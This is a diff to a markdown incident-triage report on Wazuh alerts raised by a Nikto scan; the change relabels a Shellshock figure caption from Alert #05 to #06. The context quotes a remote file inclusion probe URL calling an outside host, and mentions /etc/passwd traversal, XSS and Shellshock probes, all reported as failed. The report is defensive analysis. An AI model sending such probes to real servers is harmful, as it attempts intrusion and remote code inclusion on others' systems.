@@ -373,8 +373,8 @@ Two minutes after the Nmap scan, `192.168.232.135` runs an automated Nikto web v
 - **Common Web Attacks & Buried RFI Probe (#07):** Inside the 16 sub-events of Alert #07 (rule `31153`), one sub-event is a remote file inclusion probe (`GET /OpenSiteAdmin/scripts/classes/Form.php?path=http://blog.cirt.net/rfiinc.txt%00`) that returned 404. It is a standard scanner test buried inside #07 that failed completely.
 - **Passwd Watchlist, XSS & Unicode Traversal (#08, #09, #10):** Alert #08 logs [WATCHLIST x14: passwd]—14 hits on `/etc/passwd` path-traversal URIs (under Wazuh rule `31153`)—followed by 26 reflected XSS probes (#09, rule `31154`) and 4 `%2e%2e/` Unicode directory traversal probes (#10, rule `86601`). Every single request in #04 – #10 failed with 404 / 400 / 302 or hit a static `/login.php` page.
 
-![Alert #05 Detail: Shellshock Canary Header](../06-Resources/screenshots/initial-triage/slot_02.5_alert05_shellshock_nikto_canary.png)
-*Figure 2.5: Alert #05 detail showing Nikto's 93e4r0-CVE-2014-6271 Shellshock canary header returning 404 Not Found.*
+![Alert #06 Detail: Shellshock Canary Header](../06-Resources/screenshots/initial-triage/slot_02.5_alert05_shellshock_nikto_canary.png)
+*Figure 2.5: Alert #06 Detail: Nikto's 93e4r0-CVE-2014-6271 Shellshock canary header returning 404 Not Found.*
 
 ### ✅ Window 1 Verdict & Real Priority
 
